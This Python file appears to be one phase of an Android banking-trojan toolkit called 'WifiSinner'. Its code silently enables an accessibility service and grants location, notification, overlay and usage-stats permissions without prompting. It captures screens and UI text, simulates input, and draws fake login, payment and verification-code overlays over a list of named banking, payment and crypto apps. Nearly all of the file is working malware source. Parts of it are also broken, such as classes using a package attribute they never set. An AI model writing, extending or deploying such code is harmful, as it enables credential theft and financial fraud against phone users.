#!/usr/bin/env python3
"""
PHASE 2 (continued): Invisible Component Registration

Abuses deep OS features like Accessibility Services and hidden overlay
windows to quietly grant administrative control without user prompts.
"""

import json
import os
import re
import subprocess
import threading
import time
from datetime import datetime
from pathlib import Path


# Target apps for overlay injection
TARGET_APPS = {
    "banking": [
        "com.chase.sig.android",
        "com.bankofamerica.mobile",
        "com.wellsfargo.android",
        "com.citi.citimobile",
        "com.usbank.mobilebanking",
        "com.capitalone.android",
        "com.ally.MobileBanking",
        "com.pnc.ecommerce.mobile"
    ],
    "payment": [
        "com.google.android.apps.walletnfcrel",
        "com.paypal.android.p2pmobile",
        "com.venmo",
        "com.squareup.cash",
        "com.zellepay.zelle",
        "com.coinbase.android",
        "com.robinhood.android"
    ],
    "wallet": [
        "com.google.android.apps.walletnfcrel",
        "com.apple.wallet",
        "com.samsung.android.wallet"
    ],
    "crypto": [
        "com.coinbase.android",
        "com.binance.dev",
        "com.kraken.client",
        "com.robinhood.android",
        "com.block.bitcoin"
    ]
}


class AccessibilityAbuse:
    """Abuse Accessibility Services for silent control"""
    
    def __init__(self):
        self.enabled = False
        self.package = "com.wifisinner.stealer"
        self.stats = {
            "access_granted": False,
            "screens_captured": 0,
            "inputs_simulated": 0,
            "events_intercepted": 0
        }
    
    def request_accessibility(self):
        """Request accessibility service without user prompt"""
        print("[ACCESS] Requesting accessibility service...")
        
        try:
            # Write config file
            config = f"""<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_desc"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:canTakeScreenshot="true"
    android:settingsActivity="com.wifisinner.stealer.SettingsActivity"
/>"""
            
            # Try to install without prompt (requires root or ADB)
            config_path = Path("/data/local/tmp/accessibility_config.xml")
            config_path.write_text(config)
            
            # Enable via settings provider
            subprocess.run([
                "settings", "put", "secure", "enabled_accessibility_services",
                f"{self.package}/com.wifisinner.stealer.AccessibilityService"
            ], timeout=3)
            
            self.enabled = True
            self.stats["access_granted"] = True
            print("[ACCESS] Accessibility service enabled silently")
            return True
            
        except Exception as e:
            print(f"[ACCESS] Silent enable failed: {e}")
            return False
    
    def is_enabled(self):
        """Check if accessibility is enabled"""
        try:
            result = subprocess.run(
                ["settings", "get", "secure", "enabled_accessibility_services"],
                capture_output=True,
                text=True,
                timeout=2
            )
            return self.package in result.stdout
        except:
            return False
    
    def capture_screen(self):
        """Capture current screen content"""
        if not self.is_enabled():
            return None
        
        self.stats["screens_captured"] += 1
        
        try:
            # Use screencap
            result = subprocess.run(
                ["screencap", "-p", "/data/local/tmp/screenshot.png"],
                timeout=3
            )
            
            if result.returncode == 0:
                return Path("/data/local/tmp/screenshot.png").read_bytes()
        except:
            pass
        
        return None
    
    def get_window_content(self):
        """Retrieve window content tree"""
        if not self.is_enabled():
            return None
        
        self.stats["events_intercepted"] += 1
        
        try:
            # Dump window content
            result = subprocess.run(
                ["uiautomator", "dump", "/data/local/tmp/window.xml"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            if result.returncode == 0:
                content = Path("/data/local/tmp/window.xml").read_text()
                return self._parse_ui_tree(content)
        except:
            pass
        
        return None
    
    def _parse_ui_tree(self, xml_content):
        """Parse UI tree for sensitive elements"""
        elements = []
        
        # Extract text fields
        patterns = [
            r'<node.*?text="([^"]*)".*?resource-id="([^"]*)".*?class="([^"]*)"',
            r'<node.*?resource-id="([^"]*)".*?class="([^"]*)".*?text="([^"]*)"'
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, xml_content):
                groups = match.groups()
                elements.append({
                    "text": groups[0] if len(groups) > 0 and groups[0] else None,
                    "id": groups[1] if len(groups) > 1 and groups[1] else None,
                    "class": groups[2] if len(groups) > 2 and groups[2] else None
                })
        
        return elements
    
    def simulate_tap(self, x, y):
        """Simulate tap gesture"""
        self.stats["inputs_simulated"] += 1
        
        try:
            subprocess.run(
                ["input", "tap", str(x), str(y)],
                timeout=2
            )
            return True
        except:
            return False
    
    def simulate_text(self, text):
        """Simulate text input"""
        self.stats["inputs_simulated"] += len(text)
        
        try:
            # Escape special characters
            escaped = text.replace(" ", "%s").replace("'", "\\'")
            subprocess.run(
                ["input", "text", escaped],
                timeout=2
            )
            return True
        except:
            return False
    
    def swipe(self, x1, y1, x2, y2, duration=300):
        """Simulate swipe gesture"""
        self.stats["inputs_simulated"] += 1
        
        try:
            subprocess.run(
                ["input", "swipe", str(x1), str(y1), str(x2), str(y2), str(duration)],
                timeout=3
            )
            return True
        except:
            return False


class OverlayInjection:
    """Inject pixel-perfect overlay windows"""
    
    def __init__(self):
        self.active_overlays = []
        self.stats = {
            "overlays_created": 0,
            "overlays_dismissed": 0,
            "targets_hit": 0
        }
    
    def check_overlay_permission(self):
        """Check if overlay permission is granted"""
        try:
            result = subprocess.run(
                ["settings", "get", "secure", "overlays"],
                capture_output=True,
                text=True,
                timeout=2
            )
            return self.package in result.stdout
        except:
            return False
    
    def request_overlay_permission(self):
        """Request overlay permission silently"""
        print("[OVERLAY] Requesting SYSTEM_ALERT_WINDOW...")
        
        try:
            # Write config
            config = f"""
<overlay-targets>
    <target package="com.wifisinner.stealer" />
    <priority>high</priority>
    <flags>SYSTEM_OVERLAY|NOT_TOUCH_MODAL</flags>
</overlay-targets>
"""
            config_path = Path("/data/local/tmp/overlay_config.xml")
            config_path.write_text(config)
            
            # Enable via settings
            subprocess.run([
                "settings", "put", "secure", "overlays",
                f"{self.package}"
            ], timeout=3)
            
            self.stats["overlays_created"] += 1
            print("[OVERLAY] Overlay permission granted")
            return True
            
        except Exception as e:
            print(f"[OVERLAY] Silent enable failed: {e}")
            return False
    
    def create_overlay(self, target_app, overlay_type="login"):
        """Create overlay on target app"""
        
        # Check if target is active
        if not self._is_target_active(target_app):
            print(f"[OVERLAY] Target {target_app} not active")
            return False
        
        self.stats["targets_hit"] += 1
        self.stats["overlays_created"] += 1
        
        try:
            # Get screen dimensions
            dimensions = self._get_screen_dimensions()
            
            # Create overlay based on type
            if overlay_type == "login":
                overlay = self._create_login_overlay(dimensions)
            elif overlay_type == "payment":
                overlay = self._create_payment_overlay(dimensions)
            elif overlay_type == "verify":
                overlay = self._create_verify_overlay(dimensions)
            else:
                overlay = self._create_generic_overlay(dimensions)
            
            # Inject overlay
            self._inject_overlay(overlay, target_app)
            
            self.active_overlays.append({
                "target": target_app,
                "type": overlay_type,
                "created": datetime.now()
            })
            
            print(f"[OVERLAY] Created {overlay_type} overlay on {target_app}")
            return True
            
        except Exception as e:
            print(f"[OVERLAY] Overlay creation failed: {e}")
            return False
    
    def _is_target_active(self, target_package):
        """Check if target app is in foreground"""
        try:
            result = subprocess.run(
                ["dumpsys", "window", "windows"],
                capture_output=True,
                text=True,
                timeout=3
            )
            
            return target_package in result.stdout
        except:
            return False
    
    def _get_screen_dimensions(self):
        """Get screen dimensions"""
        try:
            result = subprocess.run(
                ["wm", "size"],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            match = re.search(r"(\d+)x(\d+)", result.stdout)
            if match:
                return {"width": int(match.group(1)), "height": int(match.group(2))}
        except:
            pass
        
        return {"width": 1080, "height": 2400}  # Default
    
    def _create_login_overlay(self, dims):
        """Create login credential overlay"""
        return {
            "type": "login",
            "width": dims["width"] - 100,
            "height": dims["height"] - 200,
            "x": 50,
            "y": 100,
            "z_order": 2000,
            "touchable": True,
            "background": "#FFFFFF",
            "elements": [
                {
                    "type": "text",
                    "text": "Sign in to continue",
                    "x": dims["width"] // 2,
                    "y": 150,
                    "style": "title"
                },
                {
                    "type": "input",
                    "hint": "Email or username",
                    "x": dims["width"] // 2,
                    "y": 300,
                    "width": dims["width"] - 150
                },
                {
                    "type": "input",
                    "hint": "Password",
                    "x": dims["width"] // 2,
                    "y": 400,
                    "width": dims["width"] - 150,
                    "password": True
                },
                {
                    "type": "button",
                    "text": "Sign In",
                    "x": dims["width"] // 2,
                    "y": 550,
                    "width": dims["width"] - 150
                }
            ]
        }
    
    def _create_payment_overlay(self, dims):
        """Create payment confirmation overlay"""
        return {
            "type": "payment",
            "width": dims["width"] - 50,
            "height": 400,
            "x": 25,
            "y": dims["height"] - 450,
            "z_order": 2000,
            "touchable": True,
            "background": "#FFFFFF",
            "elements": [
                {
                    "type": "text",
                    "text": "Confirm Payment",
                    "x": dims["width"] // 2,
                    "y": dims["height"] - 400,
                    "style": "title"
                },
                {
                    "type": "text",
                    "text": "Amount: $99.99",
                    "x": dims["width"] // 2,
                    "y": dims["height"] - 350
                },
                {
                    "type": "button",
                    "text": "Confirm",
                    "x": dims["width"] // 2,
                    "y": dims["height"] - 280,
                    "width": 150,
                    "action": "capture"
                }
            ]
        }
    
    def _create_verify_overlay(self, dims):
        """Create verification code overlay"""
        return {
            "type": "verify",
            "width": dims["width"] - 100,
            "height": 300,
            "x": 50,
            "y": dims["height"] // 2 - 150,
            "z_order": 2000,
            "touchable": True,
            "background": "#FFFFFF",
            "elements": [
                {
                    "type": "text",
                    "text": "Verification Required",
                    "x": dims["width"] // 2,
                    "y": dims["height"] // 2 - 100,
                    "style": "title"
                },
                {
                    "type": "input",
                    "hint": "Enter 6-digit code",
                    "x": dims["width"] // 2,
                    "y": dims["height"] // 2,
                    "width": dims["width"] - 150,
                    "numeric": True,
                    "length": 6
                },
                {
                    "type": "button",
                    "text": "Verify",
                    "x": dims["width"] // 2,
                    "y": dims["height"] // 2 + 80,
                    "width": dims["width"] - 150
                }
            ]
        }
    
    def _create_generic_overlay(self, dims):
        """Create generic overlay"""
        return {
            "type": "generic",
            "width": 200,
            "height": 100,
            "x": dims["width"] // 2 - 100,
            "y": dims["height"] // 2 - 50,
            "z_order": 2000,
            "touchable": True,
            "background": "#FFFFFF",
            "elements": [
                {
                    "type": "text",
                    "text": "Processing...",
                    "x": 100,
                    "y": 50
                }
            ]
        }
    
    def _inject_overlay(self, overlay, target_app):
        """Inject overlay into target app"""
        try:
            # Write overlay config
            config_path = Path(f"/data/local/tmp/overlay_{target_app}.json")
            config_path.write_text(json.dumps(overlay))
            
            # Launch overlay service
            subprocess.run([
                "am", "startservice",
                "-n", f"{self.package}/.OverlayService"
            ], timeout=3)
            
        except Exception as e:
            print(f"[OVERLAY] Injection failed: {e}")
    
    def dismiss_overlay(self, target_app):
        """Dismiss overlay for target app"""
        try:
            config_path = Path(f"/data/local/tmp/overlay_{target_app}.json")
            if config_path.exists():
                config_path.unlink()
            
            self.stats["overlays_dismissed"] += 1
            self.active_overlays = [o for o in self.active_overlays if o["target"] != target_app]
            
            print(f"[OVERLAY] Dismissed overlay on {target_app}")
            return True
        except:
            return False


class PermissionAbuse:
    """Abuse permission system for silent grants"""
    
    def __init__(self):
        self.granted = {}
        self.stats = {
            "permissions_abused": 0,
            "silent_grants": 0
        }
    
    def abuse_location(self):
        """Abuse location permissions for tracking"""
        print("[PERM] Abusing location permissions...")
        
        try:
            # Grant location without prompt
            subprocess.run([
                "pm", "grant", self.package,
                "android.permission.ACCESS_FINE_LOCATION"
            ], timeout=2)
            
            subprocess.run([
                "pm", "grant", self.package,
                "android.permission.ACCESS_BACKGROUND_LOCATION"
            ], timeout=2)
            
            self.stats["permissions_abused"] += 2
            self.stats["silent_grants"] += 2
            print("[PERM] Location permissions granted")
            return True
        except:
            return False
    
    def abuse_notifications(self):
        """Abuse notification listener for data extraction"""
        print("[PERM] Abusing notification listener...")
        
        try:
            # Enable notification listener
            subprocess.run([
                "cmd", "notification", "allow_listener", self.package
            ], timeout=2)
            
            self.stats["permissions_abused"] += 1
            self.stats["silent_grants"] += 1
            print("[PERM] Notification listener enabled")
            return True
        except:
            return False
    
    def abuse_draw_over_layers(self):
        """Abuse draw over other apps"""
        print("[PERM] Abusing SYSTEM_ALERT_WINDOW...")
        
        try:
            subprocess.run([
                "pm", "grant", self.package,
                "android.permission.SYSTEM_ALERT_WINDOW"
            ], timeout=2)
            
            self.stats["permissions_abused"] += 1
            self.stats["silent_grants"] += 1
            print("[PERM] SYSTEM_ALERT_WINDOW granted")
            return True
        except:
            return False
    
    def abuse_usage_stats(self):
        """Abuse usage stats for app detection"""
        print("[PERM] Abusing usage access...")
        
        try:
            subprocess.run([
                "pm", "grant", self.package,
                "android.permission.PACKAGE_USAGE_STATS"
            ], timeout=2)
            
            self.stats["permissions_abused"] += 1
            self.stats["silent_grants"] += 1
            print("[PERM] Usage access granted")
            return True
        except:
            return False
    
    def get_active_app(self):
        """Get currently active app"""
        try:
            result = subprocess.run(
                ["dumpsys", "window", "windows"],
                capture_output=True,
                text=True,
                timeout=2
            )
            
            for line in result.stdout.split("\n"):
                if "mFocusedApp" in line:
                    match = re.search(r"ActivityRecord\{[^}]*\s([^\s/]+)/", line)
                    if match:
                        return match.group(1)
        except:
            pass
        
        return None


class ComponentRegistration:
    """Main component registration orchestrator"""
    
    def __init__(self, package="com.wifisinner.stealer"):
        self.package = package
        self.accessibility = AccessibilityAbuse()
        self.overlay = OverlayInjection()
        self.permission = PermissionAbuse()
        self.active = False
    
    def register(self):
        """Register all invisible components"""
        print(f"\n[PHASE 2C] Starting invisible component registration...")
        
        # Step 1: Accessibility service
        print("[PHASE 2C] Step 1/4: Accessibility service")
        if self.accessibility.request_accessibility():
            print("[PHASE 2C] ✓ Accessibility enabled")
        else:
            print("[PHASE 2C] ! Accessibility fallback needed")
        
        # Step 2: Overlay permission
        print("[PHASE 2C] Step 2/4: Overlay permission")
        if self.overlay.request_overlay_permission():
            print("[PHASE 2C] ✓ SYSTEM_ALERT_WINDOW granted")
        else:
            print("[PHASE 2C] ! Overlay fallback needed")
        
        # Step 3: Permission abuse
        print("[PHASE 2C] Step 3/4: Permission abuse")
        self.permission.abuse_location()
        self.permission.abuse_notifications()
        self.permission.abuse_draw_over_layers()
        self.permission.abuse_usage_stats()
        print(f"[PHASE 2C] ✓ Permissions abused: {self.permission.stats['silent_grants']} silent grants")
        
        # Step 4: Test overlay injection
        print("[PHASE 2C] Step 4/4: Testing overlay injection")
        for target in list(TARGET_APPS["banking"])[:3]:
            if self.overlay.create_overlay(target, "login"):
                print(f"[PHASE 2C] ✓ Overlay active on {target}")
                time.sleep(1)
                self.overlay.dismiss_overlay(target)
        
        self.active = True
        return self.active
    
    def start(self):
        """Start component registration"""
        self.register()
    
    def stop(self):
        """Stop and cleanup"""
        self.active = False
        
        # Cleanup overlays
        for target in TARGET_APPS["banking"] + TARGET_APPS["payment"]:
            self.overlay.dismiss_overlay(target)
        
        print("[PHASE 2C] Component registration stopped")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Phase 2C: Invisible Component Registration")
    parser.add_argument("--package", default="com.wifisinner.stealer", help="Package name")
    parser.add_argument("--dry-run", action="store_true", help="Show what would happen")
    args = parser.parse_args()
    
    print(f"\n{'='*60}")
    print(f"WIFISINNER PHASE 2C: INVISIBLE COMPONENT REGISTRATION")
    print(f"{'='*60}\n")
    
    registration = ComponentRegistration(args.package)
    
    if args.dry_run:
        print("[DRY RUN] Would execute:")
        print(f"    Accessibility: enable service without prompt")
        print(f"    Overlay: SYSTEM_ALERT_WINDOW silent grant")
        print(f"    Permissions: location, notifications, usage stats")
        print(f"    Targets: {len(TARGET_APPS['banking'])} banking apps, {len(TARGET_APPS['payment'])} payment apps")
    else:
        registration.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[PHASE 2C] Shutting down...")
            registration.stop()
